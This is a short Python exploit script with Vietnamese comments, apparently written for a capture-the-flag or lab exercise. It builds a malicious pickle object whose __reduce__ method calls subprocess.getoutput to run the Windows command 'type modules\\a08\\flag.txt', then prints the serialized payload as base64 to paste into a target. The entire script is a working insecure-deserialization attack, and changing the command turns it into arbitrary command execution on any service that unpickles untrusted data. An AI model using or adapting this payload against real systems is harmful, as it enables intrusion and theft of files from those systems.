import pickle
import base64
import subprocess

class Exploit:
    def __reduce__(self):
        # Sử dụng lệnh 'type' kèm đường dẫn tương đối để đọc tệp tin
        # Lưu ý sử dụng dấu gạch chéo ngược kép '\\' cho Windows
        return (subprocess.getoutput, ('type modules\\a08\\flag.txt',))

# Đóng gói đối tượng và chuyển sang dạng chuỗi Base64
payload = pickle.dumps(Exploit())
base64_payload = base64.b64encode(payload).decode()

print("== PAYLOAD ĐỌC NỘI DUNG FILE (COPY CHUỖI DƯỚI ĐÂY) ==")
print(base64_payload)